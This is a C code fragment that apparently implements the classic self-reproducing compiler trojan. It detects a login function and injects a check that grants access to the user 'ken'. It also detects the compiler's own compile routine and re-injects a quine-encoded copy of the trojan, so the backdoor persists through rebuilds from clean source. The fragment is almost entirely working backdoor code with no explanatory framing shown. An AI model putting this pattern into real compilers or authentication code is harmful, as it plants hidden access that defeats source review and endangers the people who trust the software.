    static char login_sig[] = "int login(char *user) {";
    static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;"; 
    static char compile_sig[] =
            "static void compile(char *program, char *outname) {\n"
            "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
            "    assert(fp);"
            ;
    char *login_found = strstr(program, login_sig);
    char *compile_found = strstr(program, compile_sig);

    if (login_found != NULL) {
        char *pos = login_found + strlen(login_sig);
        fprintf(fp, "%.*s\n    %s", (int)(pos - program), program, login_attack);
        fprintf(fp, "%s", pos);
    }
    if (compile_found != NULL) {
        char *pos = compile_found + strlen(compile_sig);
        // ascii 
        int i;
        fprintf(fp, "char prog[] = {\n"); 
        for(i = 0; prog[i]; i++)
            fprintf(fp, "\t%d,%c", prog[i], (i+1)%8==0 ? '\n' : ' ');
        fprintf(fp, "0 };\n");
        // fprintf till signature ends
        fprintf(fp, "%.*s\n", (int)(pos - program), program); 
        // inject quine here
        fprintf(fp, "%s", prog);
        // rest of program
        // Find and skip past the line we're replacing
        char *fprintf_line = strstr(pos, "fprintf(fp, \"%s\", program);");
        if (fprintf_line != NULL) {
            // Move to the end of this line
            pos = strchr(fprintf_line, '\n');
            if (pos != NULL) {
                pos++;  // Move past the newline to start of next line
            }
        }
        
        fprintf(fp, "%s", pos);
    }

